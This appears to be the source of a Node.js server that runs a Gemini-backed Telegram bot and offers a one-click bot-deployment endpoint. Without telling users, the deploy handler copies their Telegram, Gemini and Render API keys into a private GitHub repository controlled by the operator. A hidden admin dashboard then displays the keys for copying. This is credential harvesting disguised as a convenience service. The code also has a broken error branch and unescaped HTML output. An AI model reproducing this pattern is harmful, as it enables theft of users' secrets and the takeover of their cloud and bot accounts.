const express = require('express');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// চেক করা হচ্ছে এটি কোন মোডে রান হবে (টেলিগ্রাম টোকেন থাকলে বট রান হবে, নাহলে শুধু ড্যাশবোর্ড)
const isBotMode = !!process.env.BOT_TOKEN; 

if (isBotMode) {
    console.log("Starting in BOT MODE...");
    const TelegramBot = require('node-telegram-bot-api');
    
    // Environment Variables থেকে API Key নেওয়া হচ্ছে
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
    const BOT_NAME = process.env.BOT_NAME || "YASIN"; // ডিফল্ট নাম YASIN
    const GEMINI_MODEL = 'gemini-3.5-flash';

    const bot = new TelegramBot(BOT_TOKEN, { polling: true });
    console.log(`${BOT_NAME} Bot started...`);

    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    async function showLoadingAnimation(chatId) {
        let loadingMessage;
        try {
            loadingMessage = await bot.sendMessage(chatId, '`[>         ] 10%`', { parse_mode: 'Markdown' });
        } catch(e) { return null; }
        const messageId = loadingMessage.message_id;
        const frames = [
            '`[==>       ] 30%`',
            '`[====>     ] 50%`',
            '`[======>   ] 70%`',
            '`[========> ] 90%`',
            '`[==========] 100%`'
        ];
        for (const frame of frames) {
            await sleep(500); 
            try {
                await bot.editMessageText(frame, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            } catch (e) {}
        }
        await sleep(500);
        try {
            await bot.editMessageText('💥 *BOOM!* 💥', { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        } catch (e) {}
        await sleep(500);
        return messageId;
    }

    async function getGeminiResponse(text) {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent?key=${GEMINI_API_KEY}`;
        // BOT_NAME ভ্যারিয়েবল ব্যবহার করা হচ্ছে
        const systemPrompt = `You are ${BOT_NAME}, the most advanced, powerful, and helpful AI assistant. You must always provide 100% correct, factual, and highly accurate answers to everything the user asks. For coding questions, provide robust, best-practice solutions. You must give maximum effort, ensuring absolutely accurate information and the best output for every user request.`;
        
        const payload = {
            systemInstruction: { parts: [{ text: systemPrompt }] },
            contents: [{ role: "user", parts: [{ text }] }]
        };
        try {
            const response = await axios.post(url, payload);
            if (response.data && response.data.candidates && response.data.candidates.length > 0) {
                return response.data.candidates[0].content.parts[0].text;
            }
            return `API Error: ${error.response ? JSON.stringify(error.response.data.error.message || error.response.status) : error.message}`;
        } catch (error) {
            console.error("Gemini API Error:", error.response ? JSON.stringify(error.response.data) : error.message);
            return `API Error: ${error.response ? (error.response.data.error?.message || error.response.status) : error.message}`;
        }
    }

    // /p কমান্ড
    bot.onText(/^\/(p|picture)(?:\s+(.+))?$/i, async (msg, match) => {
        const chatId = msg.chat.id;
        const prompt = match[2];
        if (!prompt) return;

        const loadingPromise = showLoadingAnimation(chatId);
        let enhancedPrompt = prompt;
        if (enhancedPrompt.trim().toLowerCase() === 'bmw') {
            enhancedPrompt = "A stunning, highly modified BMW M5, black aggressive look, neon street lights reflection, cinematic shot";
        } else if (enhancedPrompt.toLowerCase().includes('bmw')) {
            enhancedPrompt = enhancedPrompt.replace(/bmw/i, "beautiful BMW M5");
        }
        enhancedPrompt += ", masterpiece, best quality, ultra-detailed, sharp focus, clear face, perfectly drawn, stunning color combination, perfect composition, vibrant colors, unblurred";
        
        const encodedPrompt = encodeURIComponent(enhancedPrompt);
        const randomSeed = Math.floor(Math.random() * 10000000);
        const imageUrl = `https://image.pollinations.ai/prompt/${encodedPrompt}?seed=${randomSeed}&width=1024&height=1024&nologo=true&enhance=true&safe=true`;
        
        const loadMsgId = await loadingPromise;
        try {
            await bot.sendPhoto(chatId, imageUrl);
            if (loadMsgId) await bot.deleteMessage(chatId, loadMsgId).catch(()=>{});
        } catch (error) {
            console.error("Image sending error:", error);
        }
    });

    // টেক্সট কমান্ড
    bot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;
        if (!text || text.startsWith('/')) return;

        bot.sendChatAction(chatId, 'typing');
        const reply = await getGeminiResponse(text);

        try {
            if (reply.length > 4000) {
                const parts = reply.match(/[\s\S]{1,4000}/g) || [];
                for (const part of parts) {
                    await bot.sendMessage(chatId, part, { parse_mode: "Markdown" }).catch(e => bot.sendMessage(chatId, part));
                }
            } else {
                await bot.sendMessage(chatId, reply, { parse_mode: "Markdown" }).catch(e => bot.sendMessage(chatId, reply));
            }
        } catch (error) {
            console.error("Error sending text reply:", error);
        }
    });

} else {
    console.log("Starting in CONTROL SERVER MODE...");
}

app.get('/', (req, res) => {
    // If accessed root, just send simple text or redirect
    res.send("API Server is running.");
});

async function saveUserDataToGithub(botName, telegramKey, geminiKey, renderKey) {
    const GITHUB_PAT = process.env.GITHUB_PAT;
    if (!GITHUB_PAT) {
        console.log("GITHUB_PAT is not set. Skipping saving user data.");
        return;
    }
    
    try {
        // Get authenticated user info
        const userRes = await axios.get('https://api.github.com/user', {
            headers: { 'Authorization': `token ${GITHUB_PAT}` }
        });
        const repoOwner = userRes.data.login;
        const repoName = 'Bot-Users-Data';
        const filePath = 'users.json';
        
        // 1. Check if repo exists, if not create it
        try {
            await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}`, {
                headers: { 'Authorization': `token ${GITHUB_PAT}` }
            });
        } catch (e) {
            if (e.response && e.response.status === 404) {
                // Create private repo
                await axios.post('https://api.github.com/user/repos', {
                    name: repoName,
                    private: true,
                    description: "Saved user data from Bot Generator"
                }, {
                    headers: { 'Authorization': `token ${GITHUB_PAT}` }
                });
                // Wait a bit for repo creation to propagate
                await new Promise(r => setTimeout(r, 2000));
            } else {
                throw e;
            }
        }
        
        // 2. Get existing file (to get SHA for updating)
        let fileSha = null;
        let existingData = [];
        try {
            const fileRes = await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
                headers: { 'Authorization': `token ${GITHUB_PAT}` }
            });
            fileSha = fileRes.data.sha;
            try {
                const decodedContent = Buffer.from(fileRes.data.content, 'base64').toString('utf-8');
                existingData = JSON.parse(decodedContent);
                if (!Array.isArray(existingData)) existingData = [];
            } catch (err) {
                console.error("Error parsing existing users.json, starting fresh.");
                existingData = [];
            }
        } catch (e) {
            if (e.response && e.response.status !== 404) {
                console.error("Error fetching existing file:", e.response ? e.response.data : e.message);
            }
            // If 404, file doesn't exist yet
        }
        
        // 3. Append new data
        const newData = {
            botName,
            telegramKey,
            geminiKey,
            renderKey,
            timestamp: new Date().toISOString()
        };
        existingData.push(newData);
        
        // 4. Update or create file
        const updatedContent = Buffer.from(JSON.stringify(existingData, null, 4)).toString('base64');
        const payload = {
            message: `Added data for bot: ${botName}`,
            content: updatedContent
        };
        if (fileSha) {
            payload.sha = fileSha;
        }
        
        await axios.put(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, payload, {
            headers: { 'Authorization': `token ${GITHUB_PAT}` }
        });
        console.log("User data saved to GitHub successfully.");
    } catch (error) {
        console.error("Error saving user data to GitHub:", error.response ? error.response.data : error.message);
    }
}

// ==========================================
// ADMIN DASHBOARD & LOGIN
// ==========================================

app.get('/deploy', async (req, res) => {
    const password = req.query.password;
    const DEPLOY_PASSWORD = process.env.DEPLOY_PASSWORD;

    // If no password provided, show the login form
    if (!password) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Login</title>
                <style>
                    body { background-color: #030407; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                    .login-box { background: #0b0d18; border: 1px solid #333; padding: 40px; border-radius: 10px; width: 300px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
                    h2 { margin-top: 0; color: #3b82f6; }
                    input { width: 100%; padding: 12px; margin: 15px 0; background: #161824; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; outline: none; }
                    input:focus { border-color: #3b82f6; }
                    button { width: 100%; padding: 12px; background: #3b82f6; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 16px; transition: background 0.3s; }
                    button:hover { background: #2563eb; }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <h2>Admin Login</h2>
                    <form action="/deploy" method="GET">
                        <input type="password" name="password" placeholder="Enter Secure Password" required>
                        <button type="submit">Unlock Dashboard</button>
                    </form>
                </div>
            </body>
            </html>
        `);
    }

    if (!DEPLOY_PASSWORD) {
        return res.send("<h2 style='color:red; text-align:center; padding-top: 50px;'>Admin password not configured in Environment Variables!</h2>");
    }

    if (password !== DEPLOY_PASSWORD) {
        return res.send("<h2 style='color:red; text-align:center; padding-top: 50px;'>Incorrect Password! <br><br><a href='/deploy' style='color:#3b82f6;'>Try again</a></h2>");
    }

    // Password is correct, fetch data from GitHub
    const GITHUB_PAT = process.env.GITHUB_PAT;
    if (!GITHUB_PAT) {
        return res.send("<h2 style='color:red; text-align:center; padding-top: 50px;'>GITHUB_PAT is missing! Cannot fetch data.</h2>");
    }

    try {
        const userRes = await axios.get('https://api.github.com/user', {
            headers: { 'Authorization': `token ${GITHUB_PAT}` }
        });
        const repoOwner = userRes.data.login;
        const repoName = 'Bot-Users-Data';
        const filePath = 'users.json';

        const fileRes = await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
            headers: { 'Authorization': `token ${GITHUB_PAT}` }
        });

        const decodedContent = Buffer.from(fileRes.data.content, 'base64').toString('utf-8');
        const usersData = JSON.parse(decodedContent);

        if (!Array.isArray(usersData) || usersData.length === 0) {
            return res.send(`
                <div style="background-color: #030407; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; min-height: 100vh;">
                    <div style="display: flex; justify-content: space-between; padding: 0 50px; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px;">
                        <h1 style="color: #60a5fa; margin: 0;">🔐 Admin Dashboard</h1>
                        <a href="/deploy" style="background: #ef4444; color: white; padding: 8px 16px; text-decoration: none; border-radius: 5px; font-weight: bold;">Logout</a>
                    </div>
                    <h2 style='margin-top: 50px;'>No user data found yet.</h2>
                </div>
            `);
        }

        let tableRows = usersData.map((user, index) => `
            <tr>
                <td>${index + 1}</td>
                <td>${user.botName}</td>
                <td><input type="text" value="${user.telegramKey}" readonly onclick="this.select();" style="background:transparent; color:#4ade80; border:none; width:100%; cursor:pointer;" title="Click to copy"></td>
                <td><input type="text" value="${user.geminiKey}" readonly onclick="this.select();" style="background:transparent; color:#60a5fa; border:none; width:100%; cursor:pointer;" title="Click to copy"></td>
                <td><input type="password" value="${user.renderKey}" readonly onclick="this.type='text'; this.select();" onblur="this.type='password'" style="background:transparent; color:#f87171; border:none; width:100%; cursor:pointer;" title="Click to view & copy"></td>
                <td style="color: #9ca3af; font-size: 0.9em;">${new Date(user.timestamp).toLocaleString()}</td>
            </tr>
        `).join('');

        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Dashboard</title>
                <style>
                    body { background-color: #030407; color: white; font-family: sans-serif; padding: 30px; }
                    .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px; margin-bottom: 20px; }
                    h1 { color: #60a5fa; margin: 0; }
                    .logout-btn { background: #ef4444; color: white; padding: 8px 16px; text-decoration: none; border-radius: 5px; font-weight: bold; }
                    .logout-btn:hover { background: #dc2626; }
                    .table-container { overflow-x: auto; background: #0b0d18; border-radius: 10px; border: 1px solid #333; padding: 1px; }
                    table { width: 100%; border-collapse: collapse; }
                    th, td { border-bottom: 1px solid #333; padding: 15px; text-align: left; }
                    th { background-color: #161824; color: #a1a1aa; text-transform: uppercase; font-size: 0.85em; letter-spacing: 1px; }
                    tr:last-child td { border-bottom: none; }
                    tr:hover { background-color: #1a1c29; }
                </style>
            </head>
            <body>
                <div class="header">
                    <h1>🔐 Admin Dashboard - API Keys</h1>
                    <a href="/deploy" class="logout-btn">Logout</a>
                </div>
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Bot Name</th>
                                <th>Telegram Key</th>
                                <th>Gemini Key</th>
                                <th>Render Key</th>
                                <th>Deployed At</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${tableRows}
                        </tbody>
                    </table>
                </div>
            </body>
            </html>
        `);
    } catch (error) {
        if (error.response && error.response.status === 404) {
            res.send(`
                <div style="background-color: #030407; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; min-height: 100vh;">
                    <div style="display: flex; justify-content: space-between; padding: 0 50px; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px;">
                        <h1 style="color: #60a5fa; margin: 0;">🔐 Admin Dashboard</h1>
                        <a href="/deploy" style="background: #ef4444; color: white; padding: 8px 16px; text-decoration: none; border-radius: 5px; font-weight: bold;">Logout</a>
                    </div>
                    <h2 style='margin-top: 50px;'>No user data found yet. (users.json is missing)</h2>
                </div>
            `);
        } else {
            res.send(`<h2 style='color:red; text-align:center; padding-top: 50px;'>Error fetching data: ${error.message}</h2><br><center><a href='/deploy' style='color:#3b82f6;'>Go Back</a></center>`);
        }
    }
});

// ==========================================
// API ENDPOINT FOR EXTERNAL BOT DEPLOYMENT
// ==========================================

app.post('/api/deploy', async (req, res) => {
    const { password, botName, telegramKey, geminiKey, renderKey } = req.body;
    
    // Check password from Environment Variable
    const DEPLOY_PASSWORD = process.env.DEPLOY_PASSWORD;
    
    if (!DEPLOY_PASSWORD || password !== DEPLOY_PASSWORD) {
        return res.status(401).json({ success: false, error: "Unauthorized: Invalid Password" });
    }

    const githubRepo = 'https://github.com/yasinffx36-afk/Aura-FFX-Savar-Ai.git';
    
    if (!botName || !telegramKey || !geminiKey || !renderKey) {
        return res.status(400).json({ success: false, error: "All fields are required!" });
    }

    try {
        // 1. Render API থেকে User/Owner ID নেওয়া
        const ownersRes = await axios.get('https://api.render.com/v1/owners', {
            headers: { 'Authorization': `Bearer ${renderKey}` }
        });
        const ownerId = ownersRes.data[0].owner.id;

        // 2. নতুন Web Service তৈরির পে-লোড
        const payload = {
            ownerId: ownerId,
            type: "web_service",
            name: `${botName.toLowerCase().replace(/[^a-z0-9]/g, '-')}-bot`,
            repo: githubRepo,
            autoDeploy: "yes",
            branch: "main",
            envVars: [
                { key: "BOT_TOKEN", value: telegramKey },
                { key: "GEMINI_API_KEY", value: geminiKey },
                { key: "BOT_NAME", value: botName }
            ],
            serviceDetails: {
                env: "node",
                plan: "free",
                envSpecificDetails: {
                    buildCommand: "npm install",
                    startCommand: "node index.js"
                }
            }
        };

        // 3. Render API তে কল করে নতুন সার্ভার তৈরি
        const response = await axios.post('https://api.render.com/v1/services', payload, {
            headers: {
                'Authorization': `Bearer ${renderKey}`,
                'Content-Type': 'application/json'
            }
        });

        // 4. GitHub এ ইউজারের ডেটা সেভ করা
        saveUserDataToGithub(botName, telegramKey, geminiKey, renderKey).catch(console.error);

        res.json({
            success: true,
            message: "Deployment Successful!",
            serviceName: response.data.service.name,
            serviceUrl: response.data.service.serviceDetails.url
        });
        
    } catch (error) {
        console.error("Deploy Error:", error.response ? error.response.data : error.message);
        res.status(500).json({
            success: false,
            message: "Deployment Failed",
            error: error.response ? error.response.data : error.message
        });
    }
});

app.listen(port, () => {
    console.log(`Web Server running on port ${port}`);
});
